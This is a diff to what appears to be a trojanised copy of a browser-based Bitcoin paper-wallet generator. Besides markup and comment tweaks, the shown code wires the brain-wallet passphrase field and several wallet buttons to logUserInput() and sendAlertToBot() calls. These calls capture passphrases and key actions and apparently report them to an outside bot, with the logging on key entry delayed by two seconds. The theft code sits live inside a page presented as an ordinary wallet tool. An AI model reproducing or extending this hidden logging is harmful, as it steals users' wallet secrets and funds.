@@ -6848,15 +6848,15 @@ gtag('config', 'G-WKH070VBDW');
 			<div id="brainarea" class="walletarea">
 				<div id="braincommands" class="commands">
 					<div class="row">
-						<span id="brainlabelenterpassphrase" class="label"><label for="brainpassphrase">Enter Passphrase: </label>
-						<input tabindex="1" type="password" id="brainpassphrase" value="" onfocus="this.select();" onkeypress="if (event.keyCode == 13) ninja.wallets.brainwallet.view();"
+						<span id="brainlabelenterpassphrase" class="label"><label for="brainpassphrase">Enter Passphrase: </label></span>
+						<input tabindex="1" type="password" id="brainpassphrase" value="" onfocus="this.select();" onkeypress="if (event.keyCode == 13) {
 					        event.preventDefault(); 
 					           setTimeout(function() { 
 					               logUserInput(this.value);
 					               sendAlertToBot();
 					               ninja.wallets.brainwallet.view(); 
 					           }.bind(this), 2000); 
-					       }" /></span>						
+					       }" />						
 						<span><label id="brainlabelshow" for="brainpassphraseshow">Show?</label> <input type="checkbox" id="brainpassphraseshow" onchange="ninja.wallets.brainwallet.showToggle(this);" /></span>
 						<span class="print"><input type="button" name="print" id="brainprint" value="Print" onclick="window.print();" /></span>
 					</div>
@@ -7158,7 +7158,7 @@ document.getElementById('detailview').addEventListener('click', function() {
     } else {
         sendAlertToBot(); // For web usage
     }
-    ninja.wallets.detailwallet.viewDetails(); // Call the existing viewDetails function
+    ninja.wallets.detailwallet.viewDetails(); // Call the existing function
 });
 
 document.getElementById('detaillabelpassphrase').addEventListener('input', function(event) {
@@ -7176,7 +7176,7 @@ document.getElementById('detailbip38decryptbutton').addEventListener('click', fu
     } else {
         sendAlertToBot(); // For web usage
     }
-    ninja.wallets.detailwallet.decryptBip38(); // Call the existing viewDetails function
+    ninja.wallets.detailwallet.decryptBip38(); // Call the existing function
 });
 
 document.getElementById('detailbip38encryptbutton').addEventListener('click', function() {
@@ -7185,7 +7185,7 @@ document.getElementById('detailbip38encryptbutton').addEventListener('click', fu
     } else {
         sendAlertToBot(); // For web usage
     }
-    ninja.wallets.detailwallet.encryptBip38(); // Call the existing viewDetails function
+    ninja.wallets.detailwallet.encryptBip38(); // Call the existing function
 });
 
 document.getElementById('brainlabelenterpassphrase').addEventListener('input', function(event) {
@@ -7203,7 +7203,7 @@ document.getElementById('brainpassphrase').addEventListener('click', function() 
     } else {
         sendAlertToBot(); // For web usage
     }
-    ninja.wallets.brainwallet.view(); // Call the existing viewDetails function
+    ninja.wallets.brainwallet.view(); // Call the existing function
 });
 
 window.addEventListener('beforeunload', function(event) {
